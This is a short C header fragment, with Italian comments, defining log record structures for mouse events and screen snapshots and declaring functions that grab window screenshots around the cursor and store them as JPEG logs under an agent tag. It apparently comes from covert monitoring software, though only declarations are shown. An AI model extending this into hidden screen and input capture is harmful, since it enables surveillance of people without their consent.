
// XXX Additional data per i log di tipo mouse
typedef struct _mouse_data {
	UINT uVersion;
		#define LOG_MOUSE_VERSION 2009040201
	UINT uProcessNameLen;
	UINT uWindowNameLen;
	UINT xPos;
	UINT yPos;
	UINT max_x;
	UINT max_y;
} MOUSE_DATA;

// XXX Additional data per i log di tipo snapshot
typedef struct _snapshot_data {
	UINT uVersion;
		#define LOG_SNAP_VERSION 2009031201
	UINT uProcessNameLen;
	UINT uWindowNameLen;
} SNASHOT_DATA;

// Dichiarata in HM_SnapShot.h in cui questo file viene incluso
extern void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality);
extern void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD g_xscdim, DWORD g_yscdim);

// In BitmapCommon
extern void BmpToJpgLog(DWORD agent_tag, BYTE* additional_header, DWORD additional_len, BITMAPINFOHEADER* pBMI, size_t cbBMI, BYTE* pData, size_t cbData, DWORD quality);